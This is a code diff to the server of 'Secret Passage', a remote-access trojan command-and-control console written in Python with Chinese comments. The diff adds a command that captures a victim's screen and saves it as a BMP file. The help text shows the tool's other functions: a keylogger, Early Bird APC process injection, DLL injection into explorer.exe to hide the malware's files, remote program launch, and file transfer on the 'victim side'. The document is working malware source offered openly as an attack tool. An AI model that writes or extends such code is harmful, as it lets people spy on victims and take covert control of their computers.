@@ -5,7 +5,7 @@ Secret Passage — Server (C2 Console)
 功能：
   - 接收 client 連線並發送指令
   - XOR 解密通訊（與 client 共用密鑰）
-  - 支援指令：cd, download, upload, get, start, inject, kl_start, hide_files, eject_hidden, q
+  - 支援指令：cd, download, upload, get, start, inject, kl_start, screenshot, hide_files, eject_hidden, q
 
 使用方式：
   python server.py
@@ -19,6 +19,7 @@ import base64
 import struct
 import os
 import sys
+import time
 
 HOST_IP   = os.environ.get("SP_SERVER_IP",   "127.0.0.1")
 HOST_PORT = int(os.environ.get("SP_SERVER_PORT", "12345"))
@@ -111,6 +112,7 @@ HELP_TEXT = """
 │  start    <prog>   — 在受害端啟動程式                       │
 │  kl_start          — 啟動鍵盤記錄器                         │
 │  inject   <b64>    — Early Bird APC Injection               │
+│  screenshot         — 擷取受害端螢幕截圖（存為 BMP）            │
 │  hide_files [dll]  — 注入 hidden.dll 到 explorer.exe        │
 │                      隱藏 client.exe / srv.exe 等檔案       │
 │  eject_hidden      — 清除隱藏設定（需重啟 Explorer 才完整） │
@@ -208,12 +210,35 @@ def start_server():
                     handle_upload(target, command[7:].strip())
 
                 else:
-                    # 所有其他指令（get, start, inject, kl_start, hide_files, eject_hidden, shell 指令）
+                    # 所有其他指令（get, start, inject, kl_start, hide_files, eject_hidden, screenshot, shell 指令）
                     result = reliable_recv(target)
                     if result is None:
                         print("[!!] Connection lost.")
                         break
-                    print(result)
+
+                    # 處理截圖：解析 [IMG]base64[/IMG] 並存檔
+                    if isinstance(result, str) and "[IMG]" in result and "[/IMG]" in result:
+                        try:
+                            start_tag = result.index("[IMG]") + 5
+                            end_tag = result.index("[/IMG]")
+                            b64_data = result[start_tag:end_tag]
+                            img_bytes = base64.b64decode(b64_data)
+
+                            # 存檔
+                            ts = time.strftime("%Y%m%d_%H%M%S")
+                            screenshot_file = f"screenshot_{ts}.bmp"
+                            with open(screenshot_file, "wb") as f:
+                                f.write(img_bytes)
+                            print(f"[+] Screenshot saved: {screenshot_file} ({len(img_bytes)} bytes)")
+                            # 也印出非 base64 的訊息部分
+                            prefix = result[:result.index("[IMG]")].strip()
+                            if prefix:
+                                print(prefix)
+                        except Exception as e:
+                            print(f"[!!] Failed to save screenshot: {e}")
+                            print(result)
+                    else:
+                        print(result)
 
 
 if __name__ == "__main__":
